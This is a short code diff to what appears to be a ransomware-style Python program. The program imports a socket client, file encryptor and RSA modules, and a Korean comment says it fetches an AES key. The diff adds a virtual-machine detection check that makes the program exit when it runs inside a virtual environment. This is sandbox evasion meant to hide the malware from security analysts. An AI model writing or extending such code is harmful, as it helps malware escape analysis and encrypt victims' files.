@@ -3,8 +3,13 @@ from socketclient import SocketClient
 from fileencryptor import FileEncryptor
 from filedecryptor import FileDecryptor
 from rsa import RSA
+from detectvm import DetectVM
 
 def main():
+    detect_vm = DetectVM()
+    if detect_vm.detect_vm():
+        print("virtual environment detected")
+        exit(1)
     client = SocketClient()
     client.start()
     key = client.get_key(2) # aes key 가져옴
